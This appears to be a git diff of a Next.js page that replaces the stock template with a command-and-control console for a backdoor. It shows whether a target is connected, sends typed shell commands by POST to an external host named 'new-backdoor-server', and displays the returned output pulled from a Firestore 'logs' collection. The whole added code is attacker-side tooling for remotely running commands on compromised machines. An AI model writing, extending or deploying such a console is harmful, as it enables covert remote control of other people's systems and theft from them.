@@ -1,94 +1,70 @@
-import Image from 'next/image'
+"use client";
+
 import styles from './page.module.css'
+import { useCollection } from 'react-firebase-hooks/firestore';
+import { database } from '@/firebase/firebae';
+import React, {useEffect, useState} from "react"
+import { collection } from 'firebase/firestore';
+import axios from 'axios';
+
 
 export default function Home() {
+
+  const [connected, loading, error] = useCollection(
+    collection(database, 'status')
+  );
+
+    const [command, setCommand] = useState("")
+
+  const [disabled, setDisabled] = useState(true)
+
+  const [logs, _loading, _error] = useCollection(
+    collection(database, "logs")
+  )
+
+    useEffect(() => {
+      if (connected?.docs[0].data().connected) {
+        setDisabled(false)
+      } else {
+        setDisabled(true)
+      }
+    }, [connected])
+
+    const submit = async (e) => {
+      if (e.key === 'Enter') {
+        try {
+          await axios.post("https://new-backdoor-server.1.ie-1.fl0.io/command", {
+            command: command
+          })
+        setCommand("")
+        }
+        catch(error) {
+          console.log("error axios", error)
+        }
+      }
+    }
+
   return (
     <main className={styles.main}>
       <div className={styles.description}>
+        <div className={styles.connected}>
         <p>
-          Get started by editing&nbsp;
-          <code className={styles.code}>src/app/page.js</code>
+          {connected?.docs[0].data().connected ? "connected" : "not connected"}
         </p>
-        <div>
-          <a
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{' '}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className={styles.vercelLogo}
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
         </div>
-      </div>
 
-      <div className={styles.center}>
-        <Image
-          className={styles.logo}
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
+        <input onKeyDown={submit} value={command} className={styles.beef} onChange={(event) => setCommand(event.target.value)} type="text" name="name" placeholder='command' disabled={disabled} />
 
-      <div className={styles.grid}>
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Docs <span>-&gt;</span>
-          </h2>
-          <p>Find in-depth information about Next.js features and API.</p>
-        </a>
-
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Learn <span>-&gt;</span>
-          </h2>
-          <p>Learn about Next.js in an interactive course with&nbsp;quizzes!</p>
-        </a>
-
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Templates <span>-&gt;</span>
-          </h2>
-          <p>Explore the Next.js 13 playground.</p>
-        </a>
-
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className={styles.card}
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2>
-            Deploy <span>-&gt;</span>
-          </h2>
-          <p>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
+        {
+          logs?.docs?.sort((obj1, obj2) => {
+            return obj1.data().timestamp - obj2.data().timestamp
+          }).reverse().map(data => {
+            return <p className={styles.log}>
+            {data?.data().output[0]}
           </p>
-        </a>
+          })
+        }
+
       </div>
     </main>
   )
